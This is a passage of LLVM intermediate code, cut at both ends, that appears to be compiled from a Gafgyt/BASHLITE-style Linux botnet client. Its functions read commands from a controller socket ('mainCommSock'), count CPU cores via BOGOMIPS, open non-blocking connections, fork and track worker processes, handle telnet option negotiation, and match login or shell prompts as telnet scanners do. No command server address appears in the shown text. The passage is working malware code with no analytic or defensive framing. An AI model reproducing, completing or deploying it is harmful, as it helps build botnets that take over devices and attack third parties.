; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #17
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #14
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #14
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #14
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #14
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #14
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #3, !srcloc !13
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %tmpcast) #3
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #3
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #17
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !14
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #14
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext41 = shl i64 %1, 32
  %5 = ashr exact i64 %sext41, 32
  %6 = icmp sgt i32 %2, 0
  br i1 %6, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %7 = icmp sgt i32 %2, %.1.lcssa
  br i1 %7, label %.lr.ph.1.preheader, label %.critedge.1

.lr.ph.1.preheader:                               ; preds = %.preheader.137
  br label %.lr.ph.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %12, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %8 = sub nsw i64 0, %indvars.iv
  %9 = getelementptr inbounds i8, i8* %4, i64 %8
  %10 = load i8, i8* %9, align 1
  %11 = trunc i64 %indvars.iv to i32
  switch i8 %10, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %12 = add nsw i32 %.130, 1
  %13 = icmp sgt i64 %5, %indvars.iv.next
  br i1 %13, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %11, %.lr.ph ], [ %12, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %14 = sext i32 %.1.lcssa to i64
  %15 = sub nsw i64 0, %14
  %16 = getelementptr inbounds i8, i8* %4, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 58
  br i1 %18, label %19, label %.preheader.137

; <label>:19:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.1:                                         ; preds = %.lr.ph.1.preheader, %.critedge1.1
  %indvars.iv.1 = phi i64 [ %indvars.iv.next.1, %.critedge1.1 ], [ %14, %.lr.ph.1.preheader ]
  %.130.1 = phi i32 [ %24, %.critedge1.1 ], [ %.1.lcssa, %.lr.ph.1.preheader ]
  %20 = sub nsw i64 0, %indvars.iv.1
  %21 = getelementptr inbounds i8, i8* %4, i64 %20
  %22 = load i8, i8* %21, align 1
